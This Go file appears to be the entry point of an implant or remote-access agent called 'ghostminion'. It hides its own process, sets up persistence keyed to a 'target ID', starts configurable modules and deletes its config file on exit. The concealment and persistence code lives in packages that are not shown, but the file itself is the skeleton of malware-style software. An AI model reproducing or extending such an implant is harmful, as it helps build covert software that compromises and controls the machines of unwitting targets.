package main

import (
	"ghostminion/apps"
	"ghostminion/config"
	"ghostminion/core"
	"ghostminion/db"
	"ghostminion/hider"
	"ghostminion/logger"
	"ghostminion/persistence"
)

var (
	cfg = config.GetInstance()
	_   = db.GetInstance()
	lgr = logger.GetInstance()
)

func main() {
	defer config.DeleteConfig()
	defer lgr.Close()

	if err := hider.Hide(); err != nil {
		return
	}

	targetId := persistence.GeTargetID()
	err := cfg.Update(func(c *config.Config) {
		c.AgentID = targetId
	})
	if err != nil {
		lgr.Error("Error updating agent ID: " + err.Error())
	}

	lgr.Debug("targetId: %s", targetId)

	appCore := core.GetInstance()
	RegisterDefaultApps(appCore)
	appCore.Start() // todo: should run security here
}

func RegisterDefaultApps(core *core.Core) {
	am := core.AppsManager()
	for _, appConfig := range cfg.Apps {
		app, err := apps.NewAppFactory(apps.AppData{
			Id:     appConfig.Id,
			Name:   appConfig.Name,
			Type:   apps.AppType(appConfig.Type),
			Params: appConfig.Params,
		})
		if err != nil {
			return
		}
		am.Register(app)
	}
}
